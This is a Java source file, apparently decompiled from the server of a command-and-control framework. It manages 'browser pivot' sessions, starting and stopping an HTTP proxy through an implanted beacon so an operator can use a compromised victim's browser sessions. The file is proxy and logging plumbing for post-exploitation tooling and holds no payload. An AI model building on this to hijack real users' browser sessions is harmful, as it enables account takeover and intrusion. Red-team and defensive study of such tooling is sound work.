package server;

import common.BeaconOutput;
import common.CommonUtils;
import common.MudgeSanity;
import common.Reply;
import common.Request;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

import proxy.HTTPProxy;
import proxy.HTTPProxyEventListener;

public class BrowserPivotCalls implements ServerHook {
    protected Resources resources;

    protected Map sessions = new HashMap();

    public void register(Map map) {
        map.put("browserpivot.start", this);
        map.put("browserpivot.stop", this);
    }

    public BrowserPivotCalls(Resources resources) {
        this.resources = resources;
    }

    public void start(Request request, ManageUser manageUser) {
        final String bid = (String) request.arg(0);
        int i = Integer.parseInt((String) request.arg(1));
        int j = Integer.parseInt((String) request.arg(2));
        if (this.sessions.containsKey(bid)) {
            this.resources.broadcast("beaconlog", BeaconOutput.Error(bid,
                    "This beacon already has a browser pivot session. Use 'browserpivot stop' to stop it."));
            return;
        }
        try {
            HTTPProxy hTTPProxy = new HTTPProxy(i, "127.0.0.1", j);
            hTTPProxy.addProxyListener(new HTTPProxyEventListener() {
                public void proxyEvent(int n, String string) {
                    if (n == 0) {
                        BrowserPivotCalls.this.resources.broadcast("beaconlog",
                                BeaconOutput.OutputB(bid, string));
                    } else if (n == 1) {
                        BrowserPivotCalls.this.resources.broadcast("beaconlog",
                                BeaconOutput.Error(bid, string));
                    } else if (n == 2) {
                        BrowserPivotCalls.this.resources.broadcast("beaconlog",
                                BeaconOutput.Output(bid, string));
                    }
                }
            });
            this.resources.broadcast("beaconlog", BeaconOutput.Output(bid,
                    "Browser Pivot HTTP proxy is at: "
                            + ServerUtils.getMyIP(this.resources) + ":" + i));
            hTTPProxy.start();
            this.sessions.put(bid, hTTPProxy);
        } catch (IOException iOException) {
            this.resources.broadcast("beaconlog", BeaconOutput.Error(bid,
                    "Could not start Browser Pivot on port "
                            + i + ": " + iOException.getMessage()));
            MudgeSanity.logException("browser pivot start", iOException, true);
        }
    }

    public void stop(Request request, ManageUser manageUser) {
        String str = (String) request.arg(0);
        HTTPProxy hTTPProxy = (HTTPProxy) this.sessions.get(str);
        if (hTTPProxy != null) {
            hTTPProxy.stop();
            this.resources.call(manageUser, request.derive("beacons.pivot_stop_port",
                    CommonUtils.args(Integer.valueOf(hTTPProxy.getPort()))));
            this.sessions.remove(str);
            this.resources.broadcast("beaconlog", BeaconOutput.OutputB(str,
                    "Stopped Browser Pivot"));
        } else {
            this.resources.broadcast("beaconlog",
                    BeaconOutput.Error(str, "There is no active browser pivot"));
        }
    }

    public void call(Request request, ManageUser manageUser) {
        if (request.is("browserpivot.start", 3)) {
            start(request, manageUser);
        } else if (request.is("browserpivot.stop", 1)) {
            stop(request, manageUser);
        } else {
            manageUser.writeNow(new Reply("server_error", 0L, request + ": incorrect number of arguments"));
        }
    }
}
